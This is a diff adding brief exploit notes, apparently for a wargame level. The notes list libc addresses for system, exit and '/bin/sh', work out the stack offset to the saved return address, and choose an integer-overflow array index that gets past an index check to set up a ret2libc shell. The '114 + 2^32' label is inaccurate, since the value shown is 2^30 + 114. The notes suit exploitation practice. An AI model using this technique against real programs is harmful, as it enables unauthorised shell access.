@@ -1,0 +1,14 @@
+system		= 0xf7e6aed0 = 4159090384 (decimal)
+exit		= 0xf7e5eb70 = 4159040368 (decimal)
+"/bin/sh"	= 0xf7f897ec = 4160264172 (decimal)
+
+eip		= 0xffffd70c
+array	= 0xffffd544
+
+eip - array = 456 / 4 = 114 (divide by 4 because it is int sized)
+
+index 114 is protected we need to make an integer overflow to access it
+
+index eip+0 = 1073741938 (114 + 2^32) (2^32 to create integer overflow)
+index eip+1 = 115
+index eip+2 = 116
